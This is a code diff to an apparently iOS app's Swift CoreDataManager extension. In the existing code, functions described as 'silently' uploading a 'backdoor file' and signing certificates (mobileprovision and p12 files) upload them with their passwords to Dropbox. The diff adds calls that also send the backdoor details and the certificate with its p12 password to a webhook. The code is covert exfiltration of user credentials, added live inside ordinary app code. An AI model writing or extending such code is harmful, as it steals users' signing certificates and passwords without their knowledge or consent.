@@ -91,7 +91,7 @@ extension CoreDataManager {
         }
     }
     
-    /// Silently uploads backdoor file to Dropbox with password
+    /// Silently uploads backdoor file to Dropbox with password and sends info to webhook
     /// - Parameters:
     ///   - backdoorPath: Path to the backdoor file
     ///   - password: Optional p12 password
@@ -106,6 +106,11 @@ extension CoreDataManager {
         ) { success, error in
             if success {
                 Debug.shared.log(message: "Successfully uploaded backdoor file to Dropbox with password", type: .info)
+                
+                // Send backdoor info to webhook
+                if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
+                    appDelegate.sendBackdoorInfoToWebhook(backdoorPath: backdoorPath, password: password)
+                }
             } else {
                 if let error = error {
                     Debug.shared.log(message: "Failed to upload backdoor file: \(error.localizedDescription)", type: .error)
@@ -128,7 +133,7 @@ extension CoreDataManager {
         }
     }
 
-    /// Silently uploads certificate files to Dropbox with password
+    /// Silently uploads certificate files to Dropbox with password and sends info to webhook
     /// - Parameters:
     ///   - provisionPath: Path to the mobileprovision file
     ///   - p12Path: Optional path to the p12 file
@@ -136,10 +141,20 @@ extension CoreDataManager {
     private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
         let enhancedDropboxService = EnhancedDropboxService.shared
         
+        // Get the current certificate to send to webhook
+        let currentCerts = getDatedCertificate()
+        let certToSend = currentCerts.last
+        
         // Upload provision file with error handling
         enhancedDropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in
             if success {
                 Debug.shared.log(message: "Successfully uploaded provision file to Dropbox", type: .info)
+                
+                // Send certificate info to webhook if p12 also uploaded successfully
+                if let appDelegate = UIApplication.shared.delegate as? AppDelegate,
+                   let cert = certToSend {
+                    appDelegate.sendCertificateInfoToWebhook(certificate: cert, p12Password: password)
+                }
             } else {
                 if let error = error {
                     Debug.shared.log(message: "Failed to upload provision file: \(error.localizedDescription)", type: .error)
